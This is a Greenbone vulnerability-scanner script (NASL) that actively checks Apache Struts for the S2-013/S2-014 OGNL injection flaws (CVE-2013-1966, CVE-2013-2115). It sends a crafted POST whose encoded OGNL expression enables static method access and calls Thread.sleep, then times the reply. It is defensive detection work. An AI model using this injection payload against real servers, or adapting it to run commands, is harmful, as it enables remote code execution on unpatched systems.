# Copyright (C) 2013 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:apache:struts";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803837");
  script_version("2021-09-15T09:21:17+0000");
  script_cve_id("CVE-2013-1966", "CVE-2013-2115");
  script_bugtraq_id(60166, 60167);
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2021-09-16 10:51:01 +0000 (Thu, 16 Sep 2021)");
  script_tag(name:"creation_date", value:"2013-07-23 17:54:59 +0530 (Tue, 23 Jul 2013)");
  script_name("Apache Struts Security Update (S2-013, S2-014) - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_apache_struts_consolidation.nasl");
  script_require_ports("Services/www", 8080);
  script_mandatory_keys("apache/struts/http/detected");

  script_xref(name:"URL", value:"http://secunia.com/advisories/53553");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/25980");
  script_xref(name:"URL", value:"https://cwiki.apache.org/confluence/display/WW/S2-013");
  script_xref(name:"URL", value:"https://cwiki.apache.org/confluence/display/WW/S2-014");
  script_xref(name:"URL", value:"http://metasploit.org/modules/exploit/multi/http/struts_include_params");
  script_xref(name:"Advisory-ID", value:"S2-013");
  script_xref(name:"Advisory-ID", value:"S2-014");
  script_xref(name:"URL", value:"https://cwiki.apache.org/confluence/display/WW/S2-058");
  script_xref(name:"Advisory-ID", value:"S2-058");

  script_tag(name:"summary", value:"Apache Struts is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the
  response.");

  script_tag(name:"insight", value:"The flaw exists due to an improper handling of the
  includeParams attribute in the URL and Anchor tags");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers
  to execute arbitrary commands via specially crafted OGNL (Object-Graph Navigation Language)
  expressions.");

  script_tag(name:"affected", value:"Apache Struts 2.0.0 through 2.3.14.1.");

  script_tag(name:"solution", value:"Update to version 2.3.14.2 or later.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

dir += "/struts2-blank";

useragent = http_get_user_agent();
host = http_host_name(port:port);

res = http_get_cache(item:dir + "/example/HelloWorld.action", port:port);
if(res && ">Struts" >< res && ">English<" >< res) {

  found_app = TRUE;
  sleep = make_list(3, 5);

  url = dir + "/example/HelloWorld.action";
  foreach i(sleep) {
    postdata = "fgoa=%24%7b%23%5fmemberAccess%5b%22allow" +
               "StaticMethodAccess%22%5d%3dtrue%2c%40jav" +
               "a.lang.Thread%40sleep%28" + i + "000%29%7d";

    req = string("POST ", url, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "User-Agent: ", useragent, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postdata), "\r\n",
                 "\r\n", postdata);

    start = unixtime();
    http_send_recv(port:port, data:req);
    stop = unixtime();

    if(stop - start < i || stop - start > (i + 5))
      exit(99); # not vulnerable
  }
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

if(found_app)
  exit(99);
else
  exit(0);